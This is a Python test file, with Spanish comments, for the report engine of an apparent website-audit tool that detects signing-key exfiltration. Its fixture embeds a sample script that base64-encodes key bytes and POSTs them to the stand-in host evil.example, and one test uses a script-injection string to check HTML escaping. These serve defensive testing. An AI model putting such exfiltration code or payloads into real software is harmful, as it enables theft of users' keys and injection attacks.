"""Pruebas del motor de reportes.

El reporte es lo unico que la mayoria de los lectores vera. Dos cosas se
prueban con especial insistencia: que no emita una calificacion global que
invite a leerlo como un aprobado, y que el HTML escape todo lo que proviene
del sitio auditado.
"""

from __future__ import annotations

import json

import pytest

from firmascope.audit_core.conclusions import Confidence, Severity, Status
from firmascope.audit_core.events import Tag
from firmascope.audit_core.secrets import SecretVault
from firmascope.correlation_engine import correlate
from firmascope.report_engine import ReportInput, build_report, render_html, write_reports
from firmascope.rule_engine import AuditContext, RuleEngine
from firmascope.static_analyzer import analyze_scripts

from conftest import egress, key_access, local_signature


def finding(rule_id: str, status: Status, severity: Severity = Severity.HIGH,
            summary: str = "resumen", **extra) -> dict:
    base = {
        "rule_id": rule_id, "title": f"Titulo de {rule_id}", "status": status.value,
        "severity": severity.value, "confidence": Confidence.HIGH.value,
        "summary": summary, "detail": "detalle", "evidence": [],
    }
    base.update(extra)
    return base


@pytest.fixture
def sesion_con_fuga(config):
    """Sesion completa de demo-key-exfiltration, extremo a extremo."""
    events = key_access() + local_signature() + [
        egress(2.0, tags=[Tag.KEY_FILE], url="https://evil.example/collect",
               host="evil.example", body_size=2400,
               canary_matches=[{"label": Tag.KEY_FILE.value, "encoding": "base64"}]),
        egress(2.5, tags=[Tag.SIGNATURE], url="https://sitio.example/api/recibo"),
    ]
    requests = [
        {"id": "r1", "url": "https://evil.example/collect", "method": "POST",
         "timestamp": events[-2].timestamp, "third_party": True, "sensor": "proxy",
         "registrable_domain": "evil.example", "body_size": 2400},
        {"id": "r2", "url": "https://sitio.example/api/recibo", "method": "POST",
         "timestamp": events[-1].timestamp, "third_party": False, "sensor": "cdp",
         "registrable_domain": "sitio.example", "body_size": 400},
    ]
    static = analyze_scripts(
        [{"url": "https://sitio.example/app.js", "sha256": "a" * 64, "size": 120}],
        lambda s: b"async function send(keyBytes){ await fetch('https://evil.example/c',"
                  b" {method:'POST', body: btoa(keyBytes)}); }")
    correlation = correlate(events, requests, config=config)
    engine = RuleEngine()
    context = AuditContext(config=config, events=events, requests=requests,
                           static=static, correlation=correlation)
    findings = [f.to_dict() for f in engine.evaluate(context)]

    return ReportInput(
        config=config,
        session={"id": "FS-TEST-0001", "started_at": 1.0, "ended_at": 2.0, "note": ""},
        findings=findings, correlation=correlation, static=static,
        requests=requests,
        scripts=[{"url": "https://sitio.example/app.js", "sha256": "a" * 64,
                  "size": 120, "third_party": False}],
        checkpoints=[{"name": "antes-de-firmar", "network": "online", "detail": ""}],
        events=[e.to_dict() for e in events],
        catalog=engine.catalog(),
        chain_head="f" * 64, chain_ok=True, agent_sha256="b" * 64,
    )


# ----------------------------------------------------------------------
# Lo que el reporte no debe hacer
# ----------------------------------------------------------------------

def test_no_hay_puntuacion_ni_calificacion_global(sesion_con_fuga):
    """Un numero invita a compararse con otro numero. Ninguna pregunta que
    responde FirmaScope admite esa aritmetica.

    Se comprueba sobre la *estructura*, no sobre la prosa: el catalogo de
    reglas habla legitimamente de "sitio seguro" para explicar que FirmaScope
    no lo afirma, y eso debe seguir pudiendose escribir.
    """
    prohibidas = {"score", "puntuacion", "calificacion", "grade", "rating",
                  "nota", "veredicto_global", "overall"}

    def revisar(nodo, ruta=""):
        if isinstance(nodo, dict):
            for clave, valor in nodo.items():
                assert str(clave).lower() not in prohibidas, (
                    f"el reporte expone una calificacion global en {ruta}.{clave}")
                revisar(valor, f"{ruta}.{clave}")
        elif isinstance(nodo, list):
            for i, item in enumerate(nodo):
                revisar(item, f"{ruta}[{i}]")

    report = build_report(sesion_con_fuga)
    revisar(report)

    # El titular es cualitativo: un estado y una frase, nunca una cifra.
    assert set(report["headline"]) == {"status", "title", "detail", "rule_id"}
    assert report["headline"]["status"] in {s.value for s in Status}


def test_el_aviso_global_acompana_siempre_al_reporte(sesion_con_fuga):
    report = build_report(sesion_con_fuga)
    assert "no demuestra" in report["caveat"]
    assert report["caveat"] in render_html(report)


def test_cada_hallazgo_lleva_el_significado_de_su_estado(sesion_con_fuga):
    """El lector no tiene que recordar la diferencia entre los estados."""
    for item in build_report(sesion_con_fuga)["findings"]:
        assert item["status_meaning"], f"{item['rule_id']} sin significado de estado"


# ----------------------------------------------------------------------
# Titular
# ----------------------------------------------------------------------

def test_el_titular_toma_el_hallazgo_mas_fuerte(sesion_con_fuga):
    headline = build_report(sesion_con_fuga)["headline"]
    assert headline["status"] == Status.OBSERVED.value
    assert headline["rule_id"] == "FS-KEY-001"


def test_confirmado_pesa_mas_que_observado(config):
    data = ReportInput(config=config, findings=[
        finding("FS-KEY-001", Status.OBSERVED),
        finding("FS-LOCAL-001", Status.CONFIRMED, Severity.INFO),
    ])
    assert build_report(data)["headline"]["status"] == Status.CONFIRMED.value


def test_sin_hallazgos_el_titular_no_es_un_aprobado(config):
    """El caso de demo-safe: la ausencia de hallazgos no absuelve al sitio."""
    data = ReportInput(config=config, findings=[
        finding("FS-KEY-001", Status.NOT_OBSERVED),
        finding("FS-PWD-001", Status.NOT_OBSERVED),
    ])
    headline = build_report(data)["headline"]
    assert headline["status"] == Status.NOT_OBSERVED.value
    assert "no demuestra" in headline["detail"]


def test_potential_llega_al_titular_si_no_hay_nada_mas_fuerte(config):
    """demo-static-only: nada salio, pero el codigo puede hacerlo."""
    data = ReportInput(config=config, findings=[
        finding("FS-KEY-001", Status.NOT_OBSERVED),
        finding("FS-CODE-001", Status.POTENTIAL),
    ])
    headline = build_report(data)["headline"]
    assert headline["status"] == Status.POTENTIAL.value
    assert headline["rule_id"] == "FS-CODE-001"


# ----------------------------------------------------------------------
# Contenido
# ----------------------------------------------------------------------

def test_resumen_cuenta_por_estado(sesion_con_fuga):
    summary = build_report(sesion_con_fuga)["summary"]
    assert summary["rules_evaluated"] == 12
    assert sum(summary["by_status"].values()) == 12
    assert summary["exfiltration_chains"] == 1
    assert summary["third_party_domains"] == 1


def test_los_hallazgos_se_ordenan_por_relevancia(sesion_con_fuga):
    findings = build_report(sesion_con_fuga)["findings"]
    assert findings[0]["status"] in (Status.CONFIRMED.value, Status.OBSERVED.value)
    assert findings[-1]["status"] in (Status.NOT_OBSERVED.value, Status.INCONCLUSIVE.value)


def test_el_manifiesto_permite_reproducir(sesion_con_fuga):
    manifest = build_report(sesion_con_fuga)["manifest"]
    assert manifest["chain_head"] == "f" * 64
    assert manifest["chain_verified"] is True
    assert manifest["agent_sha256"] == "b" * 64
    assert manifest["script_hashes"]["a" * 64] == "https://sitio.example/app.js"
    assert manifest["environment"]["python"]
    assert manifest["config"]["capabilities"]


def test_la_red_se_agrupa_por_dominio(sesion_con_fuga):
    network = build_report(sesion_con_fuga)["network"]
    assert network["total"] == 2
    assert network["third_party"] == 1
    assert network["domains"][0]["third_party"] is True   # los terceros, primero


def test_las_cadenas_de_correlacion_llegan_al_reporte(sesion_con_fuga):
    correlation = build_report(sesion_con_fuga)["correlation"]
    assert correlation["summary"]["exfiltration"] == 1
    assert correlation["chains"][0]["narrative"]


# ----------------------------------------------------------------------
# HTML
# ----------------------------------------------------------------------

def test_html_es_autocontenido(sesion_con_fuga):
    """Un reporte que pide recursos a la red filtraria a un tercero que
    alguien esta auditando un sitio, y cuando.

    Se buscan las construcciones que *cargan* algo, no menciones textuales:
    el reporte cita inevitablemente URLs del sitio auditado dentro del texto.
    """
    import re

    markup = render_html(build_report(sesion_con_fuga))
    cargadores = (
        r"<link\b", r"<script\b", r"<img\b", r"<iframe\b", r"<embed\b",
        r"<object\b", r"<audio\b", r"<video\b", r"<source\b",
        r"@import\b", r"\bsrc\s*=", r"url\(\s*['\"]?https?:",
    )
    for patron in cargadores:
        assert not re.search(patron, markup, re.I), (
            f"el HTML puede cargar un recurso externo: {patron}")


def test_html_escapa_contenido_del_sitio_auditado(config):
    """Las URLs y el codigo vienen del sitio: es justo lo que hay que escapar."""
    hostil = '"><script>alert(1)</script>'
    config.target = f"https://sitio.example/{hostil}"
    data = ReportInput(config=config, findings=[
        finding("FS-KEY-001", Status.OBSERVED, summary=hostil),
    ])
    markup = render_html(build_report(data))

    assert "<script>alert(1)</script>" not in markup
    assert "&lt;script&gt;" in markup


def test_html_contiene_las_secciones_principales(sesion_con_fuga):
    markup = render_html(build_report(sesion_con_fuga))
    for seccion in ("Resumen", "Hallazgos", "Cadenas de procedencia", "Red",
                    "Scripts", "Reproducibilidad"):
        assert seccion in markup, f"falta la seccion {seccion}"


def test_html_muestra_los_estados_en_castellano(sesion_con_fuga):
    markup = render_html(build_report(sesion_con_fuga))
    assert "NO OBSERVADO" in markup
    assert "OBSERVADO" in markup


def test_html_de_una_sesion_vacia_no_falla(config):
    markup = render_html(build_report(ReportInput(config=config)))
    assert "<html" in markup and "</html>" in markup


# ----------------------------------------------------------------------
# Escritura
# ----------------------------------------------------------------------

def test_write_reports_escribe_ambos_ficheros(sesion_con_fuga, tmp_path):
    paths = write_reports(sesion_con_fuga, tmp_path)
    assert paths["json"].exists() and paths["html"].exists()

    report = json.loads(paths["json"].read_text(encoding="utf-8"))
    assert report["target"] == sesion_con_fuga.config.target
    assert paths["html"].read_text(encoding="utf-8").startswith("<!doctype html>")


def test_write_reports_se_niega_a_escribir_un_secreto(config, tmp_path):
    """La ultima barrera: mejor fallar que producir el fichero."""
    vault = SecretVault()
    vault.register(Tag.KEY_PASSWORD, "contrasena-secreta-de-laboratorio")

    data = ReportInput(config=config, findings=[
        finding("FS-PWD-001", Status.OBSERVED,
                detail="la contrasena era contrasena-secreta-de-laboratorio"),
    ])
    with pytest.raises(Exception):
        write_reports(data, tmp_path, vault=vault)
